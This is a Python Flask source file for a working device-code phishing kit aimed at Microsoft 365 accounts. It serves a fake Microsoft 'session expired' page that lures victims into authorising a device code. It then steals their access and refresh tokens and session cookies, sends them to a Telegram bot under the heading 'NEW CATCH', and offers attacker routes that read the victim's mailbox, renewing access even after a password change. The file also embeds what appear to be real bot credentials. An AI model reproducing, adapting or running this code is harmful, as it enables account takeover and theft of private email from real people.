import os
import time
import sqlite3
import requests
from flask import Flask, request, jsonify, render_template_string
from threading import Thread

TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
TELEGRAM_CHAT_ID = "8877118461"

# Microsoft's own first-party "Microsoft Office" app -> never shows unverified
CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
AUTHORITY = "https://login.microsoftonline.com/common"
SCOPES = "openid profile email offline_access User.Read Mail.Read Mail.ReadBasic.All"
GRAPH = "https://graph.microsoft.com/v1.0"

app = Flask(__name__)
DB = "sessions.db"

def db():
    conn = sqlite3.connect(DB)
    conn.execute("""CREATE TABLE IF NOT EXISTS sessions (
        sid TEXT PRIMARY KEY, email TEXT, access_token TEXT,
        refresh_token TEXT, expires_at REAL, cookies TEXT)""")
    conn.commit()
    return conn

def telegram(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=15)
    except Exception:
        pass

PAGE = """<!doctype html><html><head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width,initial-scale=1'>
<title>Sign in</title>
<style>
body{font-family:'Segoe UI',Arial,sans-serif;background:#f3f2f1;display:flex;
justify-content:center;align-items:center;min-height:100vh;margin:0}
.card{background:#fff;padding:44px 40px;width:100%;max-width:400px;
box-shadow:0 2px 6px rgba(0,0,0,.2)}
.logo{font-size:22px;color:#1b1b1b;margin-bottom:18px}
h2{font-size:20px;font-weight:600;color:#1b1b1b;margin:0 0 8px}
p{font-size:14px;color:#1b1b1b}
.code{font-size:26px;font-weight:700;letter-spacing:2px;color:#0067b8;
background:#f3f2f1;padding:10px 14px;display:inline-block;margin:10px 0 18px}
.btn{display:inline-block;background:#0067b8;color:#fff;text-decoration:none;
padding:10px 24px;font-size:15px;border:none;cursor:pointer}
.btn:hover{background:#106ebe}
.note{font-size:12px;color:#605e5c;margin-top:22px}
</style></head><body>
<div class='card'>
<div class='logo'><b style='color:#0067b8'>M</b>icrosoft</div>
<h2>Sign in required</h2>
<p>Your session has expired. To continue, enter this code on the Microsoft
sign-in page.</p>
<div class='code' id='code'>Loading...</div><br>
<a id='link' class='btn' style='visibility:hidden' target='_blank'
href='#'>Continue</a>
<p class='note'>Code expires in 15 minutes.</p>
</div>
<script>
async function start(){
 let r=await fetch('/start',{method:'POST'});
 let j=await r.json();
 document.getElementById('code').textContent=j.user_code;
 let l=document.getElementById('link');
 l.href='https://microsoft.com/devicelogin';l.style.visibility='visible';
 setInterval(async()=>{
   let s=await fetch('/status?sid='+j.sid);
   let sj=await s.json();
   if(sj.done){clearInterval();location='https://outlook.office.com/mail';}
 },4000);
}
start();
</script></body></html>"""

pending = {}

def harvest_cookies(refresh_token):
    """Browser-style session against Microsoft login servers to collect cookies."""
    jar = {}
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"})
    try:
        # token redemption - Microsoft sets session cookies here
        r = s.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
            "grant_type": "refresh_token", "client_id": CLIENT_ID,
            "refresh_token": refresh_token, "scope": SCOPES}, timeout=20)
        for c in s.cookies:
            jar[c.name] = c.value
        # silent authorize round-trip - picks up ESTS cookies
        s.get(f"{AUTHORITY}/oauth2/v2.0/authorize?"
              f"client_id={CLIENT_ID}&response_type=code&redirect_uri="
              f"https://login.microsoftonline.com/common/oauth2/v2.0/"
              f"authorize&scope=openid&prompt=none", timeout=20)
        for c in s.cookies:
            jar[c.name] = c.value
    except Exception:
        pass
    return jar

def try_token(sid, dc):
    r = requests.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": CLIENT_ID,
        "device_code": dc["device_code"]}, timeout=20)
    j = r.json()
    if "access_token" in j:
        who = requests.get(f"{GRAPH}/me",
            headers={"Authorization": "Bearer " + j["access_token"]},
            timeout=20).json()
        email = who.get("userPrincipalName", "unknown")
        cookies = harvest_cookies(j.get("refresh_token", ""))
        cookie_txt = "\n".join(f"{k}={v}" for k, v in cookies.items())
        conn = db()
        conn.execute("INSERT OR REPLACE INTO sessions VALUES (?,?,?,?,?,?)",
            (sid, email, j["access_token"], j.get("refresh_token", ""),
             time.time() + j.get("expires_in", 3600), cookie_txt))
        conn.commit(); conn.close()
        telegram(
            "NEW CATCH\n"
            "Email: " + email + "\n\n"
            "ACCESS TOKEN:\n" + j["access_token"] + "\n\n"
            "REFRESH TOKEN (survives password change):\n"
            + j.get("refresh_token", "none") + "\n\n"
            "COOKIES:\n" + (cookie_txt if cookie_txt else "none captured") +
            "\n\nOpen mailbox: /inbox/" + sid)
        return True
    return j.get("error") == "authorization_pending"

def watcher(sid, dc):
    for _ in range(180):  # 15 minutes
        try:
            if try_token(sid, dc):
                pending[sid] = "done"
                return
        except Exception:
            pass
        time.sleep(5)

def get_fresh_token(row):
    """Auto-renew using the refresh token - works even if password changed."""
    if time.time() < row[4]:
        return row[2]
    r = requests.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
        "grant_type": "refresh_token", "client_id": CLIENT_ID,
        "refresh_token": row[3], "scope": SCOPES}, timeout=20)
    j = r.json()
    if "access_token" not in j:
        return None
    conn = db()
    conn.execute("""UPDATE sessions SET access_token=?, refresh_token=?,
        expires_at=? WHERE sid=?""",
        (j["access_token"], j.get("refresh_token", row[3]),
         time.time() + j.get("expires_in", 3600), row[0]))
    conn.commit(); conn.close()
    return j["access_token"]

@app.route("/")
def home():
    return render_template_string(PAGE)

@app.route("/start", methods=["POST"])
def start():
    sid = str(int(time.time()))
    dc = requests.post(f"{AUTHORITY}/oauth2/v2.0/devicecode",
        data={"client_id": CLIENT_ID, "scope": SCOPES}, timeout=20).json()
    pending[sid] = dc
    Thread(target=watcher, args=(sid, dc), daemon=True).start()
    return jsonify({"user_code": dc["user_code"], "sid": sid})

@app.route("/status")
def status():
    sid = request.args.get("sid", "")
    return jsonify({"done": pending.get(sid) == "done"})

@app.route("/inbox/<sid>")
def inbox(sid):
    conn = db()
    row = conn.execute("SELECT * FROM sessions WHERE sid=?", (sid,)).fetchone()
    conn.close()
    if not row:
        return "No session. Check Telegram.", 404
    token = get_fresh_token(row)
    if not token:
        return "Token expired.", 401
    msgs = requests.get(
        f"{GRAPH}/me/mailFolders/inbox/messages?$top=25&"
        f"$select=subject,from,bodyPreview",
        headers={"Authorization": "Bearer " + token}, timeout=20).json()
    rows = "".join(
        f"<tr><td>{m['from']['emailAddress']['address']}</td>"
        f"<td><a href='/mail/{sid}/{m['id']}'>{m['subject']}</a></td></tr>"
        for m in msgs.get("value", []))
    return (f"<h2>Inbox: {row[1]}</h2>"
            f"<table border=1 cellpadding=6>{rows}</table>")

@app.route("/mail/<sid>/<mid>")
def mail(sid, mid):
    conn = db()
    row = conn.execute("SELECT * FROM sessions WHERE sid=?", (sid,)).fetchone()
    conn.close()
    if not row:
        return "No session", 404
    token = get_fresh_token(row)
    if not token:
        return "Token expired.", 401
    m = requests.get(f"{GRAPH}/me/messages/{mid}?$select=subject,from,body",
        headers={"Authorization": "Bearer " + token}, timeout=20).json()
    from_ = m.get("from", {}).get("emailAddress", {}).get("address", "?")
    return (f"<h2>{m.get('subject','')}</h2><p><b>From:</b> {from_}</p><hr>"
            + m.get("body", {}).get("content", ""))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
